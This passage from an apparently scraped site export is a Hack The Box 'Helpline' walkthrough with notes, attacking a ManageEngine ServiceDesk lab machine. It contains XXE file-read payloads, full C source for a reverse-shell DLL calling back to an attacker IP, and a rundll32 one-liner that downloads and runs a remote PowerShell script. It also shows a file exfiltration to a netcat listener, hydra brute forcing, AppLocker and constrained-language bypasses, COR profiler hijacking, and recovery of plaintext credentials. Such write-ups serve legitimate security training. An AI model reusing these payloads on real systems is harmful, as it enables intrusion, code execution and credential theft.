\u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;pinkie\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;\u0026amp;pie;\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;/record\u0026gt; \u0026lt;/records\u0026gt; \u0026lt;/API\u0026gt;  Somehow i cleaned up the output. We got alice\u0026rsquo;s password but for what and how do we use it? I checked the creds against smb \u0026amp; the website. These are user credentials and port 5985.\n{\u0026quot;API\u0026quot;:{\u0026quot;locale\u0026quot;:\u0026quot;en\u0026quot;,\u0026quot;version\u0026quot;:\u0026quot;1.0\u0026quot;,\u0026quot;response\u0026quot;:{\u0026quot;operation\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;add\u0026quot;,\u0026quot;result\u0026quot;:{\u0026quot;statuscode\u0026quot;:\u0026quot;3016\u0026quot;,\u0026quot;status\u0026quot;:\u0026quot;Unable to perform the requested operation.\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;Unable to add the CI(s), please refer the error message.\u0026quot;,\u0026quot;created-date\u0026quot;:\u0026quot;Jun 8, 2019 01:27 AM\u0026quot;},\u0026quot;Details\u0026quot;:{\u0026quot;records\u0026quot;:{\u0026quot;failed\u0026quot;:[\u0026quot;1\u0026quot;,{\u0026quot;ci\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;Tomcat Server 3\\r\\nlocal Windows account created\\r\\n\\r\\nusername: alice\\r\\npassword: $sys4ops@megabank!\\r\\nadmin required: no\\r\\n\\r\\nshadow admin accounts:\\r\\n\\r\\nmike_adm:Password1\\r\\ndr_acc:dr_acc\u0026quot;,\u0026quot;error\u0026quot;:\u0026quot;\\'Product Name\\' cannot be empty.\u0026quot;}}],\u0026quot;success\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;total\u0026quot;:\u0026quot;1\u0026quot;}}}}}}  admin required: no pass user:\talice | pass:\t$sys4ops@megabank! shadow admin acounts below user:\tmike_adm | pass:\tPassword1 dr_ass dr_ass  SHELL ##### ALICE ##### pass:$sys4ops@megabank!\nsetup winrm, do some enumeration, find out this boxes sucks really quickly clm, applocker \u0026amp; av that seems to pick up everything. We find the E:\\ drive gain some creds from psql.\nDownload, winrm.rb make it look like the below picture. i would recommend reading the winrm github repot.\nHere are a list of commands i ran to enumerate the user. READ MY NOTES for more details on the different commands ran.\nwhoami /priv #nothing systeminfo # denied $ExecutionContext.SessionState.Languagemode #constrainted language mode netstat -ant or pant #8081 was odd but never checked it out  Once i run i check for clm is i am in a constrained language mode i will check the available versions of powershell. this is a easy way to see if version two is available. you can use different bypasses depending on the version. I also use to check it by the directory.\nreg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026quot; dir C:\\Windows\\Microsoft.NET\\Framework\\  Enumerating Drives on windows\nI recently did ethereal and remember that 0xdf used a command to enumerate possible drives. I never investigated the d: drive not really sure if its anything.\nfsutil fsinfo drives  PSQL\nE: The ManageEngine pgsql. Luckily I did flujab recently following ippsec and 0xdf guides. I\u0026rsquo;m slowly getting better at sql tables. ManageEngine uses pgsql(psql) to run the site, it took quite of bit of time to find the directory for pgsql i must have gleamed over it or it was changed.\nBelow is the path to psql.exe well use this to interact witht the sql server it is using default credentials. There are a bunch of other cool things in the pgsql\\bin directory.\ncd E:\\ManageEngine\\ServiceDesk\\pgsql\\bin  From the root directory you there is another bin\u0026rsquo;s folder that has changeDBServer.bat this file will give you the necessary information to login into the console. there is a cool exploit if i had the ability to write to these files. below is a example of editing one of the files during start up to elevate our session.\nChangeJRE.bat start \u0026quot;\u0026quot; \u0026quot;C:\\ManageEngine\\ADManger Plus\\bin\\privesc.exe\u0026quot;  Minatotw gave my a hint to mess with the pgsql. The below bit will dump all the tables. here well find a bunch of useful information. We could enumerate the whole website from here gaining all the information need about the target company. Services usernames passwords. im sure the credentials are reused. The below command generated two interesting tables aaauser aaapassword, i believe these naming conventions are quite common. i have used the triple a\u0026rsquo;s before.\nI reused the sql from flujab to enumerate the webapp.\n.\\psql.exe -h 127.0.0.1 -U postgres -p 65432 -d servicedesk -c \u0026quot;select 1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS\u0026quot; -h host -U username -d name of the database -c command line  aaauser aaapassword  ![sql-password (2)https://chickenpwny.github.io/images/helpline/sql-password (2).PNG)\ncd into E:\\manageengine\\servicedesk\\pgsql\\bin then run the command for aaapasssword.\n.\\psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \u0026quot;select * from aaauser\u0026quot; .\\psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \u0026quot;select * from aaapassword\u0026quot;  Put all the strings into a file like beylow. then move it over to where ever you crack the passwords. i move everything to my host to crack. the hashcat hash example page is always a good reference.\nhashcat -m 3200 hash-helpline.txt rockyou.txt  userlicenseusageinfo $sys4ops@megabank! 1234567890 1q2w3e4r 0987654321 guest  The winner is 0987654321\nWEVTUTIL.EXE EVENT LOGS\nFiguring out how to use these creds was such a pain but checking localgroup policy really helped. It revealed the zachery has the ability to read event logs on the system. Using wevutil.exe to check out all the security logs.\nc:\\windows\\system32\\wevtutil.exe el /r:helpline /u:helpline\\zachary /p:0987654321 el ENUMERATE EVENT LOG NAMES /u USERNAME /p PASSWORD /r REMOTE COMPUTER NAME  You\u0026rsquo;ll notice the file is rather large using invoke web-request post method to move the file is an option. i had some issue using grep to find the string. also saving the security logs in a xml format and moving them over then using firefox to view the logs is an option. I found the simplest solution is pipping it over to FINDSTR is the windows equivalent of grep.\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil\nc:\\windows\\system32\\wevtutil.exe qe Security /r:helpline /u:helpline\\zachary /p:0987654321 /f:text /rd:true | findstr tolu /qe querry /f format text, xml /rd direction true most recent false oldest.  ![toluhttps://chickenpwny.github.io/images/helpline/tolu.PNG)\nTOLU !zaq1234567890pl!99\nGo to the E: drive, Tolu has more privilege than alice. so we gain more access in the E drive. we gain access to scripts, inside the scripts directory a folder a powershell script and a text file. Im going to spend a bit of time talk about the script has it\u0026rsquo;s the beginning to the end.\nThe script changes directories, then proceeds to clean up past attempts by using Remove-Item. Run\u0026rsquo;s  NetStat checks the ports running, checks the api status. Uploads something to locally to the webserver. Not really sure what thats about because perhaps moving the file for some reason. does some more checks.\nFor more detail about the script go the notes. From now on well be focusing on the filter \u0026amp; invoke-expression. When the script sanitizes user input it about covers every character and finding escape characters was a challenge.\nBLACKLISTED\nspace dll exe scripts:cmd,ps1,bat \u0026amp; } { / \\ \u0026quot;\u0026quot; \\ \u0026lt;\u0026lt;=== the single quote is used as an escape. ' ) ( .  APPLOCKER\nChecking applocker is import an important part of windows enumeration. Command line tool to get the policy is Get-AppLockerPolicy output to a file to a xml format. Applocker rule enforcement is applied to a collection of rules. there should be minimum of four rule collections installers, executable, Dll, \u0026amp; Scripts\nMove the file over using invoke-webrequest post method. we\u0026rsquo;ll have to remove the header when it\u0026rsquo;s sent over. setup a NetCat listener i like to use the verbose switch so i know if it connects etc. you will have to close the listener to close out everything, just check the bytes to know it\u0026rsquo;s completely finished uploading.\nGet-AppLockerPolicy -Effective -XML \u0026gt; meow.xml Invoke-WebRequest -Uri http://10.10.15.57 -Proxy 'http://10.10.15.57:80' -Method Post -InFile meow.xml nc -lvp 80 \u0026gt; meow.xml  Once the xml file is moved over open the file with a browser. Well noticed there are five rules as mentioned above, were allowed to run DLL\u0026rsquo;S and scripts in e:\\scripts.\nInvoke-Expression\n!should-looklike](C:\\Users\\charl\\OneDrive\\Pictures\\hackthebox\\helpline\\should-looklike.PNG)\nSo to test this out I made a smaller version of the script locally to testout. there are some key difference, i don\u0026rsquo;t have another user account runnig the script. so that affected the output.\nPLEASE GO TO THE NOTES FOR MORE DETAILS.\nAssembling the DLL\nThere are there parts to a dll when it comes to compiling them dllmain.cpp the payload revshell.cpp and a header file rev_shell.h. i tried compiling this in visual studios, i also tried the msfvenom build dlls. Defender Laughs.\ndllmain.cpp I tried awhole host of different dllmains this is the one i got to work. it calls in the header section revshell.h, DLL_PROCESS cal the revshell and assembles our payload.\n#include \u0026quot;rev_shell.h\u0026quot; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReservered) { switch (fwdReason) { case DLL_PROCESS_ATTACH: rev_shell(); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; }  revshell.cpp CHANGE THE REMOTE_PORT AND REMOTE_ADDR\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;process.h\u0026gt; #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; #pragma comment(lib, \u0026quot;Ws2_32.lib\u0026quot;) #define REMOTE_ADDR \u0026quot;10.10.14.2\u0026quot; #define REMOTE_PORT \u0026quot;9135\u0026quot; void rev_shell() { FreeConsole(); WSADATA wsaData; int iResult = WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); struct addrinfo *result = NULL, *ptr = NULL, hints; memset(\u0026amp;hints, 0, sizeof(hints)); hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP; getaddrinfo(REMOTE_ADDR, REMOTE_PORT, \u0026amp;hints, \u0026amp;result); ptr = result; SOCKET ConnectSocket = WSASocket(ptr-\u0026gt;ai_family, ptr-\u0026gt;ai_socktype, ptr-\u0026gt;ai_protocol, NULL, NULL, NULL); connect(ConnectSocket, ptr-\u0026gt;ai_addr, (int)ptr-\u0026gt;ai_addrlen); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdInput = (HANDLE)ConnectSocket; si.hStdOutput = (HANDLE)ConnectSocket; si.hStdError = (HANDLE)ConnectSocket; TCHAR cmd[] = TEXT(\u0026quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\CMD.EXE\u0026quot;); CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); WSACleanup(); }  rev_shell.h\n#pragma Once void rev_shell();  Compiling the DLL -\nhttps://egre55.github.io/system-properties-uac-bypass/\nhttps://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/\nFirstly install mingw there are a bunch of version you want, no need them all. apt-get install mingw*\nx86_64-w64-mingw32-gcc -shared -o death-piex86.dll dllmain.cpp revshell.cpp rev_shel  Cor Profiler BYPASS\nI got pretty close using some other methods mentioned in my notes. Using Enviromental variable that are global for all users. i was able to call  .\\l.cmd  which used the cor profile bypass to get a shell as leo. You may call a nishang shell or a meterpreter shell. creating the dll it pretty straight forward.\nset \u0026quot;COR_ENABLE_PROFILING=1\u0026quot; set \u0026quot;COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}\u0026quot; set \u0026quot;COR_PROFILER_PATH=c:\\windows\\system32\\drivers\\spool\\color\\revshell.dll\u0026quot; tzsync  set up the listener if us used nishang netcat meterpreter use multi/handler. All we have to do is sit back and wait for 5 minutes. YOU DONT HAVE TO DO THE COR PROFILE YOU MAY JUST RUNDLL32 TO TARGET THE REVSHELL.DLL\nCLM BYPASS using powershdll.dll\nThis was a very cool way to bypass clm using a dll, when you can\u0026rsquo;t use executables To, bypass clm download powershdll and then use rundll32 https://github.com/p3nt4/PowerShdll you may replace revshell.dll with any dll you wish to run. YOU DONT NEED TO BE LEO TO RUN THIS YOU MAY RUN IT BEFORE COR\ncopy the below string to l.cmd for whatever reason the simicolon is important xD\nrundll32 \u0026quot;c:\\windows\\system32\\spool\\drivers\\color\\powershdll.dll\u0026quot;,main \u0026quot;iex(new-object net.webclient).downloadstring('http://10.10.15.104/invoke-pie.ps1');\u0026quot;  This is what it should look like.\nLEO\nThe mysterious string, is it base encoded? what what is it? This is a powershell Secure string. XD doesn\u0026rsquo;t exactly look like a base64 encoded string the letter\u0026rsquo;s are lowercase characters. You cannot move the secure string off the system and decrypt it.\n01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa  $ppassw = get-content c:\\users\\leo\\desktop\\admin-pass.xml $spassw = convertto-securestring $ppassw $BSTR = [system.runtime.interopservices.marshal]::securestringtobstr($spassw) $unpassw = [system.runtime.interopservices.marshal]::ptrtostringauto($BSTR) echo $unpassw  login using winrm user administrator, password mb@letmein@SERVER#acc\nREADING THE FLAGS reading all the flags we got all dem passwords we are leet.\nwith our shell as leo, we can collect all the flags using the store admin password in admin-pass.xml, con ering the password for tolu into a securestring.\n $pie = convertto-securestring \u0026quot;!zaq1234567890pl!99\u0026quot; -asplaintext -force  *using kali nishang or other shell\n$pie = convertto-securestring \u0026quot;!zaq1234567890pl!99\u0026quot; -asplaintext -force $cred = New-Object System.Management.Automation.PSCredential 'tolu',$pie invoke-command -computer localhost -auth credssp -credential $cred -scriptblock {type c:\\users\\tolu\\desktop\\user.txt} $pinkie = convertto-securestring \u0026quot;mb@letmein@SERVER#acc\u0026quot; -asplaintext -force $cred = New-Object System.Management.Automation.PSCredential 'Administrator',$pinkie invoke-command -computer localhost -auth credssp -credential $cred -scriptblock {type c:\\users\\administrator\\desktop\\root.txt}  using windows winrm\nthen need to add helpline.htb to trusted hosts\n Enable-WSManCredSSP -Role Client -DelegateComputer {helpline.htb}  it will prompt for the password and bam\n Enter-PSSession -ComputerName helpline.htb -Credential administrator -authentication cred  "
},
{
	"uri": "/hackthebox/boxes/helpline/notes/",
	"title": "Helpdesk-Notes",
	"tags": [],
	"description": "",
	"content": " MEGABANK Solutions\nGeneral\n(password audit) author : Luis R. UPDATED = administrator / suspecting she isn\u0026rsquo;t the true administrator\n\u0026quot;Please see password audit attached. Continue to update this spreadsheet with identified credentials.\u0026quot; note:A password audit has been done  (support)\nPlease follow the steps mentioned below for support file generation: Go to 'Support' tab. Click on 'Support File'. This would create a file with extension zip.gz Please mail this file to servicedeskplus-support@manageengine.com [ Valid as on ServiceDesk Plus release 7.0 ]  (servicedesk upgrade) author : Luis R.\nThis is important a domain name change has been issues from http to https http://euservicedesk https://euservicedesk DETAILS: 172.16.249.137 AddSolution.do?Submitaction=newsolution CustomReportHandler.do Luis is a administrator  (remote.access) author : Luis Ribeiro Date= dec, 22 2018\n*remoteaccess.megabank.com ##### (chrome \u0026amp; internet explorer) *password Windows UserName \\PASS username+employee number *Enter employee number # notes email icon's/ share icons / internet explorer icon can be used so some automater user might be here. phone numbers  Notes HardWare author : Luis Ribeiro date = above\nwindows 10 server 2016 used in enviroment. ssd drive erase software is in a directory. http://www.datarecoveryspecialists.co.uk/blog/how-to-securely-erase-an-ssd  SOFTWARE AUTHOR : administrator date July 14th\n(settings)\nYou can move the data from the existing server to new server. Please follow the steps mentioned below: 1. Stop ManageEngine ServiceDesk Plus service 2. Kindly Upgrade the SD+ if needed. Take the link below to check if you are in the latest version; http://manageengine.com/products/service-desk/service-packs.html Now start and stop the service once after the upgrade process. 3. In the command prompt, move to [ServiceDeskPlus-Home]\\bin directory and execute backupdata.batto start the data backup. Once the backup is over, a directory named \u0026quot;backup\u0026quot; will be created in [ServiceDeskPlus-Home], within which another directory with the name \u0026quot;Backup_[Versionnumber]_Monthdate_Year_Hour_Minutes\u0026quot; will be created and the backup file with .data extension is placed in this directory. The name of the backup file contains the date and time at which backup is taken. Example:BackUp_5501_SEP14_2006_15_51.data cmd\u0026gt; [ServiceDeskPlus Home]\\bin cmd\u0026gt; backUpData.bat 4. Install SD+ to the new server. 5. Copy the backup folder from the old server to [ServiceDeskPlus-Home] in the new server. 6.To restore the backed up data, Go to [ServiceDeskPlus-Home]\\bin directory and execute restoredata.bat. Choose the backup file while prompted. See example below: cmd\u0026gt; [ServiceDeskPlus Home]\\bin cmd\u0026gt; restoreData.bat 7. Start the SD+ server once after restoring the data in the new server. [ Valid as on ServiceDesk Plus release 7.0 ]  (customizations)\nFind below the procedure to meet with your need: 1. Save the page served under http://[servername-or-ipaddress:port-number] as index.html. Copy this file onto C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war 2. Modify the index.html page as per your needs and the save the file under the same location. 3. Keep the FORM Submit and Action options as they are. 4. Edit the Web.xml file present under C:\\ManageEngine\\ServiceDesk\\applications\\extracted\\AdventNetServiceDesk.eear\\AdventNetServiceDeskWC.ear\\AdventNetServiceDesk.war\\WEB-INF and change the following: \u0026lt;form-login-page\u0026gt;/Login.jsp\u0026lt;/form-login-page\u0026gt; should be changed as \u0026lt;form-login-page\u0026gt;/index.html\u0026lt;/form-login-page\u0026gt; AND \u0026lt;form-error-page\u0026gt;/Login.jsp?error=true\u0026lt;/form-error-page\u0026gt; should be changed as \u0026lt;form-error-page\u0026gt;/index.html\u0026lt;/form-error-page\u0026gt; 5. Restart ServiceDesk Plus service. 6. You can now access the modified index page as http://[servername-or-ipaddress:port-number]/index.html Note: This file is bound to changes everytime a servicepack or hotfix is released. Hence, when you apply the hotfix or servicepack, you must redo the changes. [ Valid as on ServiceDesk Plus release 7.0 ]  (troubleshooting)\nPlease follow the steps mentioned below for support file generation: Go to 'Support' tab. Click on 'Support File'. This would create a file with extension zip.gz Please mail this file to servicedeskplus-support@manageengine.com [ Valid as on ServiceDesk Plus release 7.0 ]  Found a excelsheet. i installed openoffice to view the .xlsx file. The initial finding are underwhelming but some content has been hidden. Go to format \u0026gt; select sheet \u0026gt; show. this will show all hidden sheets. Which will reveal some more notes. We find usernames, passwords. it also reveals some of the finer details privileges which accounts share the same password. Also what systems are associated with the passwords. we become aware of a directory it_logins.txt squee\nThe recent penetration test revealed some accounts with weak password security, probably there are more. We should also consider something that can automate account discovery. Please update this document with any accounts/logins which you suspect have weak / easily guessable passwords.     oracle scott tiger priv     wordpresshydra admin megabank1 priv   windows 7 local admin Administrator Megabank123!    MFT download clients megabank1    jump box gavin  priv    File containing details from subsequent audit saved to C:\\Temp\\Password Audit\\it_logins.txt on HELPLINE  The Ability to seach for users. This added some new users anne, fiona, mary, stephen\nwfuzz -c -w /home/htb/wordlist/seclist/Usernames/Names/names.txt -u \u0026quot;http://10.10.10.132:8080/domainServlet/AJaxDomainServlet?action=searchLocalAuthDomain\u0026amp;timestamp=Thu%20Jun%2006%202019%2013:30:22%20GMT-0400%20(EDT)\u0026amp;search=FUZZ\u0026quot; --hh 4  HYDRA!\n hydra 10.10.10.132 -s 8080 -L user.txt -P /home/htb/wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-100.txt http-form-post \u0026quot;/j_security_check:j_username=^USER^\u0026amp;j_password=^PASS^\u0026amp;LDAPEnable=false\u0026amp;hidden=Select+a+Domain\u0026amp;hidden=For+Domain\u0026amp;AdEnable=false\u0026amp;DomainCount=0\u0026amp;LocalAuth=No\u0026amp;LocalAuthWithDomain=No\u0026amp;dynamicUserAddition_status=true\u0026amp;localAuthEnable=true\u0026amp;logonDomainName=-1\u0026amp;loginButton=Login\u0026amp;checkbox=checkbox:Username or Password is incorrect\u0026quot;  XXE - Stand for XML External Entity traversal\nan xxe attack takes advantage of how an application parses xml input. since the webserver will return the output of the xml file. Xml entity allows us to read files on the system/disk. The header creates a external entity thats using a system call and assigns it to the variable in the xml file. printing the contenets of any file on the system.\nThe first reference will help understand the different elements of xxe vuln. the second provice a proof of concept script that verifies this vuln works. It help understand what was needed and what was not. The last was the most helpful but getting it to work was tricky\n ### references ###   https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/ https://github.com/devcoinfet/Manage-Engine-9.3-xxe-/commit/624ca1cdcc126a5396e652aebedbf3a85256d058 https://labs.integrity.pt/advisories/cve-2017-9362/index.html  Below is the first valid response that wasn\u0026rsquo;t a 3002 or 3026 xml errors. foo \u0026amp; file are variables that can b arbitrarily replace, except file:///. also the order matters in the labs.integrity didn\u0026rsquo;t add the xml version part. To get it to work on this system need to add the api version. then incert the variable in value.\ni used cyber-chef to url-encode the strings. burp just does a whacky lame job of encoding in my opinion. crt+u then crtl + u it will encode the + to %2b instead of %20\nOPERATION_NAME=add\u0026amp;INPUT_DATA=\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY file SYSTEM \u0026quot;file:///C:\\Temp\\Password Audit\\it_logins.txt\u0026quot;\u0026gt;]\u0026gt; \u0026lt;API version='1.0' locale='en'\u0026gt; \u0026lt;value\u0026gt;\u0026amp;file;\u0026lt;/value\u0026gt; \u0026lt;/API\u0026gt;  without the xml version it will give a xml error.\nThis produced the desired output. in the next section i played around with how much i need to get the same output.\nliOPERATION_NAME=add\u0026amp;INPUT_DATA=\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY file SYSTEM \u0026quot;file:///C:\\Temp\\Password Audit\\it_logins.txt\u0026quot;\u0026gt;]\u0026gt; \u0026lt;API version='1.0' locale='en'\u0026gt; \u0026lt;records\u0026gt; \u0026lt;record\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;CI Name\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;Tomcat Server 3\u0026amp;file;\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;CI Type\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;Business Service\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Site\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;(empty)\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Business Impact\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;High\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Description\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;Domain Conroller \u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Availability Target(%)\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;200\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Service Support Hours\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;24X5\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Cost\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;8080\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;Incident restoration target\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;90%\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;/record\u0026gt; \u0026lt;/records\u0026gt; \u0026lt;/API\u0026gt;  So most of the stuff is just fluff and not necessary to get it run.\nOPERATION_NAME=add\u0026amp;INPUT_DATA=\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY pie SYSTEM \u0026quot;file:///C:\\Temp\\Password Audit\\it_logins.txt\u0026quot;\u0026gt;]\u0026gt; \u0026lt;API version='1.0' locale='en'\u0026gt; \u0026lt;records\u0026gt; \u0026lt;record\u0026gt; \u0026lt;parameter\u0026gt; \u0026lt;name\u0026gt;pinkie\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;\u0026amp;pie;\u0026lt;/value\u0026gt; \u0026lt;/parameter\u0026gt; \u0026lt;/record\u0026gt; \u0026lt;/records\u0026gt; \u0026lt;/API\u0026gt;  i can\u0026rsquo;t really read this\n{\u0026quot;API\u0026quot;:{\u0026quot;locale\u0026quot;:\u0026quot;en\u0026quot;,\u0026quot;version\u0026quot;:\u0026quot;1.0\u0026quot;,\u0026quot;response\u0026quot;:{\u0026quot;operation\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;add\u0026quot;,\u0026quot;result\u0026quot;:{\u0026quot;statuscode\u0026quot;:\u0026quot;3016\u0026quot;,\u0026quot;status\u0026quot;:\u0026quot;Unable to perform the requested operation.\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;Unable to add the CI(s), please refer the error message.\u0026quot;,\u0026quot;created-date\u0026quot;:\u0026quot;Jun 8, 2019 01:27 AM\u0026quot;},\u0026quot;Details\u0026quot;:{\u0026quot;records\u0026quot;:{\u0026quot;failed\u0026quot;:[\u0026quot;1\u0026quot;,{\u0026quot;ci\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;Tomcat Server 3\\r\\nlocal Windows account created\\r\\n\\r\\nusername: alice\\r\\npassword: $sys4ops@megabank!\\r\\nadmin required: no\\r\\n\\r\\nshadow admin accounts:\\r\\n\\r\\nmike_adm:Password1\\r\\ndr_acc:dr_acc\u0026quot;,\u0026quot;error\u0026quot;:\u0026quot;\\'Product Name\\' cannot be empty.\u0026quot;}}],\u0026quot;success\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;total\u0026quot;:\u0026quot;1\u0026quot;}}}}}}  admin required: no pass user:\talice | pass:\t$sys4ops@megabank! shadow admin acounts below user:\tmike_adm | pass:\tPassword1 dr_ass dr_ass  SHELL ##### ALICE #####\nWe land and find our selves in constraint language mode. ran and checked the net framework version 2 isn\u0026rsquo;t there so can\u0026rsquo;t use that bypass. ran netstat to found that port 8081 is open locally. Obvisiously going to tunnel and gain access to localhost.\nEnum CLM\nGet-ExecutionPolicy -List | Format-Table -AutoSize  $ExecutionContext.SessionState.LanguageMode  powershell -nop -c \u0026quot;iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')\u0026quot;  Enum .NET/powershell = figure out which bypass method should be used. this basically tells us what powershell version are available.\nreg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026quot;  FailureOn top of everything else applocker is blocking msbuild.exe, group policy is also blocking other bypass methods. After digging around on google trying out various applocker bypasses. using csc.exe c compile to bypass applocker.\nWhitelist evation write by khr0x40sh https://github.com/khr0x40sh/WhiteListEvasion which will build our payload and generate a C# c sharp template. will produce .net binary that we will use to evade AppLocker. it uses msfvenom to generate the shell.\napplocker shut down the above method C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe\nEnum Netstat -ant\nEnumerating powershell version because sometimes 32 or a older version of powershell is skipped so i run through and check whats available.\n[Environment]::Is64BitProcess returns =\tTrue  USER TRIED USING ALICE PASSWORD ON ACCOUNTS BELOW\nLEO TOLU ZACHARY ALICE ADMINISTRATOR  #### FOUND SOME DRIVES!! ####\nI recently did ethereal and remember that 0xdf used a command to enumerate possible drives.\nfsutil fsinfo drives  D: Denied\nPSQL\nE: The ManageEngine pgsql. Luckly I did flujab recently following ippsec and 0xdf guides. I\u0026rsquo;m slowly getting better at sql tables. ManageEngine uses pgsql(psql) to run the site, it took quite of bit of time to find the directory for pgsql i must have gleemed over it or it was changed.\nBelow is the path to psql.exe well use this to interact witht the sql server it is using default credentials. There are a bunch of other cool things in the pgsql\\bin directory.\ncd E:\\ManageEngine\\ServiceDesk\\pgsql\\bin  From the root directory you there is another bin\u0026rsquo;s folder that has changeDBServer.bat this file will give you the necessary information to login into the console. there is a cool exploit if i had the ability to write to these files. below is a example of editing one of the files during start up to elevate our session.\nChangeJRE.bat start \u0026quot;\u0026quot; \u0026quot;C:\\ManageEngine\\ADManger Plus\\bin\\privesc.exe\u0026quot;  Minatotw gave my a hint to mess with the pgsql. The below bit will dump all the tables. here well find a bunch of useful information. We could enumerate the whole website from here gaining all the information need about the target company. Services usernames passwords. im sure the credentials are reused. The below command generated two interesting tables aaauser aaapassword, i believe these naming conventions are quite common. i have used the triple a\u0026rsquo;s before.\nI reused the sql from flujab to enumerate the webapp.\n.\\psql.exe -h 127.0.0.1 -U postgres -p 65432 -d servicedesk -c \u0026quot;select 1,2,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),4,5 from INFORMATION_SCHEMA.COLUMNS\u0026quot; -h host -U username -d name of the database -c command line  aaauser aaapassword  .\\psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \u0026quot;select * from aaauser\u0026quot; .\\psql.exe -h 127.0.0.1 -p 65432 -U postgres -d servicedesk -c \u0026quot;select * from aaapassword\u0026quot;  AAAUSER it\u0026rsquo;s nice to see howard stern still has gainful employment.\nSystem $DEPT_HEAD$ Guest administrator Shawn Adams Heather Graham John robberts Howard 